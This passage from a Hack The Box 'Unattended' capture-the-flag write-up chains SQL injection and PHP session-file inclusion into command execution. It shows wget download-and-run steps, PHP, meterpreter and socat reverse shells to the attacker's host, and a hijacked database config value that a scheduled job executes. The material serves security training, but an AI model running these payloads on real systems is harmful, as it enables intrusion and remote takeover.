<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cat /etc/iptables/rules.v4')?&gt;;</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.10.3</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 23 Aug 2019 16:27:11 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1592</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
<span class="na">X-Upstream</span><span class="p">:</span> <span class="s">127.0.0.1:8080</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
----------------
 Removed Output
----------------
<span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
PHPSESSID|s:26:"c5vmccsqkle2rdionj28kit221";RCE|s:46:"# Generated by iptables-save v1.6.0 on Wed Dec 19 21:55:49 2018
*filter
:INPUT DROP [7:1813]
:FORWARD ACCEPT [0:0]
:OUTPUT DROP [34:2661]
-A INPUT -i lo -j ACCEPT
-A INPUT -i ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A INPUT -i ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
-A INPUT -i ens33 -p icmp -j ACCEPT
-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -j DROP
-A OUTPUT -o lo -j ACCEPT
-A OUTPUT -o ens33 -m state --state RELATED,ESTABLISHED -j ACCEPT
-A OUTPUT -o ens33 -p tcp -m multiport --dports 80,443 -j ACCEPT
-A OUTPUT -o ens33 -p icmp -j ACCEPT
COMMIT
# Completed on Wed Dec 19 21:55:49 2018
";<span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>

<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
<span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>

<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>
<p>We can only get a reverse shell on ports 443 and 80. My problem was trying to get a connection on port 1337.<br>
<code class="language-plaintext highlighter-rouge">nc</code> wasn’t on the box so I used <code class="language-plaintext highlighter-rouge">php</code> to get a reverse shell.<br>
<code class="language-plaintext highlighter-rouge">shell.sh</code> :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("10.10.xx.xx",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre></div></div>
<p>I started a python server on port 80 then I downloaded the shell file on the box and executed it :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; wget http://10.10.xx.xx/shell.sh')?&gt;;</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/index.php?id=25%27+UNION+SELECT+%22main%27+UNION+SELECT+%27/var/lib/php/sessions/sess_c5vmccsqkle2rdionj28kit221%27%3b--+%22%3b--+</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">www.nestedflanders.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=c5vmccsqkle2rdionj28kit221; RCE=&lt;?php passthru('cd /tmp &amp;&amp; sh shell.sh')?&gt;;</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div>
<p>And we get a shell as <code class="language-plaintext highlighter-rouge">www-data</code> :
<br><img src="/images/hackthebox/unattended/16.png" alt="" class="align-center"><br><br>
But I didn’t like 2 things about this shell. First thing, it wasn’t a tty shell. Second thing, with only 2 ports available It was annoying because I usually need more shells. So I created a <code class="language-plaintext highlighter-rouge">php</code> <code class="language-plaintext highlighter-rouge">meterpreter</code> payload because with <code class="language-plaintext highlighter-rouge">meterpreter</code> I can spawn as many shells as I want and they can be tty shells.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=80 &gt; shell.php                                                                                          
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1110 bytes
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /tmp
$ wget http://10.10.xx.xx/shell.php
--2019-08-23 13:09:38--  http://10.10.xx.xx/shell.php
Connecting to 10.10.xx.xx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1110 (1.1K) [application/octet-stream]
Saving to: 'shell.php'

     0K .                                                     100% 92.4M=0s

2019-08-23 13:09:39 (92.4 MB/s) - 'shell.php' saved [1110/1110]

$ php ./shell.php
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; use multi/handler
set msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
payload =&gt; php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 10.10.xx.xx
LHOST =&gt; 10.10.xx.xx
msf5 exploit(multi/handler) &gt; set LPORT 80
LPORT =&gt; 80
msf5 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.xx.xx:80
[*] Sending stage (38247 bytes) to 10.10.10.126
[*] Meterpreter session 1 opened (10.10.xx.xx:80 -&gt; 10.10.10.126:47866) at 2019-08-23 19:09:59 +0200

meterpreter &gt;
</code></pre></div></div>
<p><br><img src="/images/hackthebox/unattended/17.png" alt="" class="align-center"><br><br>
Note : I stopped the python server before starting the listener because both of them use port 80.<br></p>

<h2 id="shell-as-guly-user-flag">Shell as guly, User Flag</h2>
<p>There is only one user on the box : <code class="language-plaintext highlighter-rouge">guly</code>, and we can’t access the home directory :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@unattended:/tmp$ ls -la /home     
ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Dec 20  2018 .
drwxr-xr-x 22 root root 4096 Dec 21  2018 ..
drwxr-x---  2 guly guly 4096 Apr  2 17:11 guly
www-data@unattended:/tmp$ cd /home/guly
cd /home/guly
bash: cd: /home/guly: Permission denied
www-data@unattended:/tmp$ 
</code></pre></div></div>
<p>Earlier we got the database credentials from <code class="language-plaintext highlighter-rouge">index.php</code> and we couldn’t dump the whole database because of the slow process, let’s check the database :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@unattended:/tmp$ mysql -h localhost -u nestedflanders -p
mysql -h localhost -u nestedflanders -p
Enter password: 1036913cf7d38d4ea4f79b050f171e9fbf3f5e

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 14511
Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; 
</code></pre></div></div>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">neddy</span><span class="p">;</span>
<span class="n">use</span> <span class="n">neddy</span><span class="p">;</span>
<span class="n">Reading</span> <span class="k">table</span> <span class="n">information</span> <span class="k">for</span> <span class="k">completion</span> <span class="k">of</span> <span class="k">table</span> <span class="k">and</span> <span class="k">column</span> <span class="k">names</span>
<span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="k">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="k">to</span> <span class="k">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>

<span class="k">Database</span> <span class="n">changed</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
<span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
<span class="o">+</span><span class="c1">-----------------+</span>
<span class="o">|</span> <span class="n">Tables_in_neddy</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------------+</span>
<span class="o">|</span> <span class="n">config</span>          <span class="o">|</span>
<span class="o">|</span> <span class="n">customers</span>       <span class="o">|</span>
<span class="o">|</span> <span class="n">employees</span>       <span class="o">|</span>
<span class="o">|</span> <span class="n">filepath</span>        <span class="o">|</span>
<span class="o">|</span> <span class="n">idname</span>          <span class="o">|</span>
<span class="o">|</span> <span class="n">offices</span>         <span class="o">|</span>
<span class="o">|</span> <span class="n">orderdetails</span>    <span class="o">|</span>
<span class="o">|</span> <span class="n">orders</span>          <span class="o">|</span>
<span class="o">|</span> <span class="n">payments</span>        <span class="o">|</span>
<span class="o">|</span> <span class="n">productlines</span>    <span class="o">|</span>
<span class="o">|</span> <span class="n">products</span>        <span class="o">|</span>
<span class="o">+</span><span class="c1">-----------------+</span>
<span class="mi">11</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">config</code> looks interesting, let’s check it :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>                                                                                                                                                                             
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>

<span class="o">+</span><span class="c1">-----+-------------------------+--------------------------------------------------------------------------+         </span>
<span class="o">|</span> <span class="n">id</span>  <span class="o">|</span> <span class="n">option_name</span>             <span class="o">|</span> <span class="n">option_value</span>                                                             <span class="o">|</span>           
<span class="o">+</span><span class="c1">-----+-------------------------+--------------------------------------------------------------------------+          </span>
<span class="o">|</span>  <span class="mi">54</span> <span class="o">|</span> <span class="n">offline</span>                 <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">55</span> <span class="o">|</span> <span class="n">offline_message</span>         <span class="o">|</span> <span class="n">Site</span> <span class="n">offline</span><span class="p">,</span> <span class="n">please</span> <span class="n">come</span> <span class="n">back</span> <span class="n">later</span>                                     <span class="o">|</span>           
<span class="o">|</span>  <span class="mi">56</span> <span class="o">|</span> <span class="n">display_offline_message</span> <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">57</span> <span class="o">|</span> <span class="n">offline_image</span>           <span class="o">|</span>                                                                          <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">58</span> <span class="o">|</span> <span class="n">sitename</span>                <span class="o">|</span> <span class="n">NestedFlanders</span>                                                           <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">59</span> <span class="o">|</span> <span class="n">editor</span>                  <span class="o">|</span> <span class="n">tinymce</span>                                                                  <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">60</span> <span class="o">|</span> <span class="n">captcha</span>                 <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">61</span> <span class="o">|</span> <span class="n">list_limit</span>              <span class="o">|</span> <span class="mi">20</span>                                                                       <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">62</span> <span class="o">|</span> <span class="k">access</span>                  <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">63</span> <span class="o">|</span> <span class="n">debug</span>                   <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">64</span> <span class="o">|</span> <span class="n">debug_lang</span>              <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">65</span> <span class="o">|</span> <span class="n">dbtype</span>                  <span class="o">|</span> <span class="n">mysqli</span>                                                                   <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">66</span> <span class="o">|</span> <span class="k">host</span>                    <span class="o">|</span> <span class="n">localhost</span>                                                                <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">67</span> <span class="o">|</span> <span class="n">live_site</span>               <span class="o">|</span>                                                                          <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">68</span> <span class="o">|</span> <span class="n">gzip</span>                    <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">69</span> <span class="o">|</span> <span class="n">error_reporting</span>         <span class="o">|</span> <span class="k">default</span>                                                                  <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">70</span> <span class="o">|</span> <span class="n">ftp_host</span>                <span class="o">|</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span>                                                                <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">71</span> <span class="o">|</span> <span class="n">ftp_port</span>                <span class="o">|</span> <span class="mi">21</span>                                                                       <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">72</span> <span class="o">|</span> <span class="n">ftp_user</span>                <span class="o">|</span> <span class="n">flanders</span>                                                                 <span class="o">|</span>
<span class="o">|</span>  <span class="mi">73</span> <span class="o">|</span> <span class="n">ftp_pass</span>                <span class="o">|</span> <span class="mi">0</span><span class="n">e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466</span> <span class="o">|</span>       
<span class="o">|</span>  <span class="mi">74</span> <span class="o">|</span> <span class="n">ftp_root</span>                <span class="o">|</span> <span class="o">/</span>                                                                        <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">75</span> <span class="o">|</span> <span class="n">ftp_enable</span>              <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">76</span> <span class="o">|</span> <span class="k">offset</span>                  <span class="o">|</span> <span class="n">UTC</span>                                                                      <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">77</span> <span class="o">|</span> <span class="n">mailonline</span>              <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">78</span> <span class="o">|</span> <span class="n">mailer</span>                  <span class="o">|</span> <span class="n">mail</span>                                                                     <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">79</span> <span class="o">|</span> <span class="n">mailfrom</span>                <span class="o">|</span> <span class="n">nested</span><span class="o">@</span><span class="n">nestedflanders</span><span class="p">.</span><span class="n">htb</span>                                                <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">80</span> <span class="o">|</span> <span class="n">fromname</span>                <span class="o">|</span> <span class="n">Neddy</span>                                                                    <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">81</span> <span class="o">|</span> <span class="n">sendmail</span>                <span class="o">|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">sendmail</span>                                                       <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">82</span> <span class="o">|</span> <span class="n">smtpauth</span>                <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">83</span> <span class="o">|</span> <span class="n">smtpuser</span>                <span class="o">|</span>                                                                          <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">84</span> <span class="o">|</span> <span class="n">smtppass</span>                <span class="o">|</span>                                                                          <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">85</span> <span class="o">|</span> <span class="n">smtppass</span>                <span class="o">|</span>                                                                          <span class="o">|</span>         
<span class="o">|</span>  <span class="mi">86</span> <span class="o">|</span> <span class="n">checkrelease</span>            <span class="o">|</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">guly</span><span class="o">/</span><span class="n">checkbase</span><span class="p">.</span><span class="n">pl</span><span class="p">;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">guly</span><span class="o">/</span><span class="n">checkplugins</span><span class="p">.</span><span class="n">pl</span><span class="p">;</span>                      <span class="o">|</span>          
<span class="o">|</span>  <span class="mi">87</span> <span class="o">|</span> <span class="n">smtphost</span>                <span class="o">|</span> <span class="n">localhost</span>                                                                <span class="o">|</span>
<span class="o">|</span>  <span class="mi">88</span> <span class="o">|</span> <span class="n">smtpsecure</span>              <span class="o">|</span> <span class="k">none</span>                                                                     <span class="o">|</span>
<span class="o">|</span>  <span class="mi">89</span> <span class="o">|</span> <span class="n">smtpport</span>                <span class="o">|</span> <span class="mi">25</span>                                                                       <span class="o">|</span>
<span class="o">|</span>  <span class="mi">90</span> <span class="o">|</span> <span class="n">caching</span>                 <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
<span class="o">|</span>  <span class="mi">91</span> <span class="o">|</span> <span class="n">cache_handler</span>           <span class="o">|</span> <span class="n">file</span>                                                                     <span class="o">|</span>
<span class="o">|</span>  <span class="mi">92</span> <span class="o">|</span> <span class="n">cachetime</span>               <span class="o">|</span> <span class="mi">15</span>                                                                       <span class="o">|</span>
<span class="o">|</span>  <span class="mi">93</span> <span class="o">|</span> <span class="n">MetaDesc</span>                <span class="o">|</span>                                                                          <span class="o">|</span>
<span class="o">|</span>  <span class="mi">94</span> <span class="o">|</span> <span class="n">MetaKeys</span>                <span class="o">|</span>                                                                          <span class="o">|</span>
<span class="o">|</span>  <span class="mi">95</span> <span class="o">|</span> <span class="n">MetaTitle</span>               <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>
<span class="o">|</span>  <span class="mi">96</span> <span class="o">|</span> <span class="n">MetaAuthor</span>              <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>
<span class="o">|</span>  <span class="mi">97</span> <span class="o">|</span> <span class="n">MetaVersion</span>             <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
<span class="o">|</span>  <span class="mi">98</span> <span class="o">|</span> <span class="n">robots</span>                  <span class="o">|</span>                                                                          <span class="o">|</span>
<span class="o">|</span>  <span class="mi">99</span> <span class="o">|</span> <span class="n">sef</span>                     <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>
<span class="o">|</span> <span class="mi">100</span> <span class="o">|</span> <span class="n">sef_rewrite</span>             <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
<span class="o">|</span> <span class="mi">101</span> <span class="o">|</span> <span class="n">sef_suffix</span>              <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>
<span class="o">|</span> <span class="mi">102</span> <span class="o">|</span> <span class="n">unicodeslugs</span>            <span class="o">|</span> <span class="mi">0</span>                                                                        <span class="o">|</span>          
<span class="o">|</span> <span class="mi">103</span> <span class="o">|</span> <span class="n">feed_limit</span>              <span class="o">|</span> <span class="mi">10</span>                                                                       <span class="o">|</span>         
<span class="o">|</span> <span class="mi">104</span> <span class="o">|</span> <span class="n">lifetime</span>                <span class="o">|</span> <span class="mi">1</span>                                                                        <span class="o">|</span>          
<span class="o">|</span> <span class="mi">105</span> <span class="o">|</span> <span class="n">session_handler</span>         <span class="o">|</span> <span class="n">file</span>                                                                     <span class="o">|</span>         
<span class="o">+</span><span class="c1">-----+-------------------------+--------------------------------------------------------------------------+                                                                                                      </span>
<span class="mi">52</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span>
</code></pre></div></div>
<p>The row with id 86 looks interesting. It has a value of some <code class="language-plaintext highlighter-rouge">perl</code> scripts :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/guly/checkbase.pl;/home/guly/checkplugins.pl;
</code></pre></div></div>
<p>Apparently these scripts get executed from time to time, we can’t read these scripts or replace them, but we can change the value of that configuration from the database and put a reverse shell command. There’s no <code class="language-plaintext highlighter-rouge">nc</code> so I used <code class="language-plaintext highlighter-rouge">socat</code> :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">update</span> <span class="n">config</span> <span class="k">set</span> <span class="n">option_value</span><span class="o">=</span><span class="nv">"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.xx.xx:443;"</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">86</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
<span class="k">Rows</span> <span class="n">matched</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">Changed</span><span class="p">:</span> <span class="mi">0</span>  <span class="n">Warnings</span><span class="p">:</span> <span class="mi">0</span>                                                     

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">config</span><span class="p">;</span>                                                                       
<span class="c1">----------------</span>
 <span class="n">Removed</span> <span class="k">Output</span>
<span class="c1">----------------</span>
<span class="o">|</span>  <span class="mi">86</span> <span class="o">|</span> <span class="n">checkrelease</span>            <span class="o">|</span> <span class="n">socat</span> <span class="k">exec</span><span class="p">:</span><span class="s1">'bash -li'</span><span class="p">,</span><span class="n">pty</span><span class="p">,</span><span class="n">stderr</span><span class="p">,</span><span class="n">setsid</span><span class="p">,</span><span class="n">sigint</span><span class="p">,</span><span class="n">sane</span> <span class="n">tcp</span><span class="p">:</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">443</span><span class="p">;</span> <span class="o">|</span>
<span class="c1">----------------</span>
 <span class="n">Removed</span> <span class="k">Output</span>
<span class="c1">----------------</span>
<span class="mi">52</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">neddy</span><span class="p">]</span><span class="o">&gt;</span>
</code></pre></div></div>
<p><br><img src="/images/hackthebox/unattended/18.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="initrd-root-flag">initrd, Root Flag</h2>
<p>After getting a shell as <code class="language-plaintext highlighter-rouge">guly</code> I terminated my <code class="language-plaintext highlighter-rouge">meterpreter</code> session as <code class="language-plaintext highlighter-rouge">www-data</code> and got a new one as <code class="language-plaintext highlighter-rouge">guly</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp$ wget http://10.10.xx.xx/shell.php
wget http://10.10.xx.xx/shell.php
--2019-08-23 13:25:49--  http://10.10.xx.xx/shell.php
Connecting to 10.10.xx.xx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1110 (1.1K) [application/octet-stream]
Saving to: ‘shell.php’

shell.php           100%[===================&gt;]   1.08K  --.-KB/s    in 0s

2019-08-23 13:25:49 (100 MB/s) - ‘shell.php’ saved [1110/1110]

guly@unattended:/tmp$ php ./shell.php
php ./shell.php
/*
</code></pre></div></div>
<p><br><img src="/images/hackthebox/unattended/19.png" alt="" class="align-center"><br><br>
I noticed that <code class="language-plaintext highlighter-rouge">guly</code> was in the local group <code class="language-plaintext highlighter-rouge">grub</code>, I searched for files that are owned by this group :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guly@unattended:/tmp$ find / -group grub
find / -group grub
find: ‘/proc/tty/driver’: Permission denied
find: ‘/proc/1146/task/1146/fd/7’: No such file or directory
find: ‘/proc/1146/task/1146/fdinfo/7’: No such file or directory
find: ‘/proc/1146/fd/6’: No such file or directory
find: ‘/proc/1146/fdinfo/6’: No such file or directory
find: ‘/lost+found’: Permission denied
find: ‘/var/spool/cron/crontabs’: Permission denied
find: ‘/var/spool/rsyslog’: Permission denied
find: ‘/var/tmp/vmware-root_861-3988621786’: Permission denied
find: ‘/var/tmp/vmware-root’: Permission denied
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-Mjh5Or’: Permission denied           
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-apache2.service-xDCH4o’: Permission denied  
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-w07Cfj’: Permission denied
find: ‘/var/tmp/systemd-private-5706e28397b54bc0b26acb5f73105e4f-systemd-timesyncd.service-90T8ai’: Permission denied
find: ‘/var/log/mysql’: Permission denied
find: ‘/var/log/apache2’: Permission denied
find: ‘/var/lib/vmware-caf/pme/data/input/monitor’: Permission denied
find: ‘/var/lib/vmware-caf/pme/data/output’: Permission denied
find: ‘/var/lib/php/sessions’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/proxy’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
